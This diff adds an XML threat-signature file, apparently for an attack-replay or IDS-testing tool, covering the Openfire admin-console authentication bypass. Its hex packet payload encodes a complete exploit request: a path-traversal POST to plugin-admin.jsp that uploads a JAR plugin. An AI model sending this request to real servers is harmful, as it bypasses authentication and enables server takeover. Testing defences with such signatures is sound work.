@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Jive Software Openfire Jabber Server Authentication Bypass"/>
+    <EngDesc display="true" value="An authentication bypass vulnerability exists in Openfire Server product by Jive Software. The vulnerability is due to an insecure design in the Tomcat filter where all functions in the admin web-interface are not protected from unauthorized access. Remote attackers could exploit this vulnerability to access functions in the admin web-interface without supplying valid credentials. A successful attack attempt will bypass the server authentication and the attacker can have full access to all functions in the admin webinterface without providing any user credentials. Thus the attacker can gain full control of the Openfire Jabber server and cause disclosure of sensitive information."/>
+    <Intent display="true">
+      <item value="Command_Execution/Design_Weakness"/>
+    </Intent>
+    <Protocol display="true" value="Jabber Admin Console over HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Jive"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Jive_Software_Openfire_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Jive_Software_Openfire_Server_prior_to_3.6.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="7d4878919bd1548a8fa7ad35c1b306da"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633996802977797451"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1264069802" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="AA"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="AB"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="AA"/>
+      <for index="AB"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:CA:00:08" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="05DC" Identification="E001" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="F32D" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="34271" destPort="$destPort" SeqNumber="CD9471DE" AckNumber="9976C93D" HeaderLength="08" WindowSize="002E" Checksum="E703" UrgentPointer="0000" Options="0101080A4EC4AE23007C8E4E" Payload="504F5354202F73657475702F73657475702D2F2E2E2F2E2E2F706C7567696E2D61646D696E2E6A73703F75706C6F6164706C7567696E20485454502F312E310D0A486F73743A203137322E31362E382E3230323A393039300D0A4163636570743A20746578742F786D6C2C6170706C69636174696F6E2F786D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C746578742F68746D6C3B713D302E392C746578742F706C61696E3B713D302E382C696D6167652F706E672C2A2F2A3B713D302E350D0A4163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C6465666C6174650D0A4163636570742D436861727365743A2049534F2D383835392D312C7574662D383B713D302E372C2A3B713D302E370D0A4B6565702D416C6976653A203330300D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A526566657265723A20687474703A2F2F3137322E31362E382E3230323A393039302F706C7567696E2D61646D696E2E6A73700D0A43616368652D436F6E74726F6C3A206E6F2D63616368650D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A206D756C7469706172742F666F726D2D646174613B20626F756E646172793D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D3130383534333130323031303230320D0A436F6E74656E742D4C656E6774683A2031333336300D0A0D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D3130383534333130323031303230320D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D2275706C6F616466696C65223B2066696C656E616D653D22656D61696C4C697374656E65722E6A6172220D0A436F6E74656E742D547970653A206170706C69636174696F6E2F6F637465742D73747265616D0D0A0D0A504B03040A000000000078779B37000000000000000000000000090004004D4554412D494E462FFECA0000504B03040A000000080077779B3794893C8B5E0000006A000000140000004D4554412D494E462F4D414E49464553542E4D46F34DCCCB4C4B2D2ED10D4B2D2ACECCCFB35230D433E0E572CC4312712C484CCE4855008A0125CDF44C79B99C8B52134B5253749D2A41EA4DF50CE20D0D75930C8C1534824BF3147C33938BF28B2B8B4B52738B153CF392F53479B978B900504B03040A000000000078779B37000000000000000000000000040000006C69622F504B03040A000000000078779B37000000000000000000000000040000007765622F504B03040A000000000078779B370000000000000000000000000C0000007765622F5745422D494E462F504B03040A000000080077779B379773274BD2010000B00400000E0000006368616E67656C6F672E68746D6CA554616BDB3010FDBC40FEC32D65DF624BCECA3A1ACDB0C68114B2350C8FD18FB27DB105B26464A54D36F6DF2725E9428DD38D4D6024EBDE9DDE3DF1C45E2777B3F47E358745FA6909ABAF37CBDB198C0242BEBD9D1192A4C921701952480D57ADB0422B2E09997F1EC5C3C170C02A5BCBD8CFC80B37BF62565889F1BCE642C252B416151A58C94D2914CC2AAE4A94BA64E4001B0EC00DD6DA9D44B0BB063F8C2C6E2DC9DB76740CFA717397DCC38FD3BF1F6BAD6CD08AEF08D71051FA667A0AFF7C9E39863471DFA2B7C29AD742EE5C0DCB2B5DF3313CA029B8720B6E049763A8503EA015B9DB699D02418B46ACA7E7B9D0F03DD6FD6416932E854E178D9DF6C51F51949575884CCBA28B68785108550612D71E129D3BFCE375A55D6F5D065EEEA0C05C1BEEEFD655505AE119FED1DF49F88FCA45E1E533F29DFE7BDBCFB429D00499B656D7BE46B3858B3CCFA1D55274C14F52FD464F9A6D5FA7A7AD347DB9E35C6F8C70A22A7C3C4FBCFFE2722DB571A10BFA" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
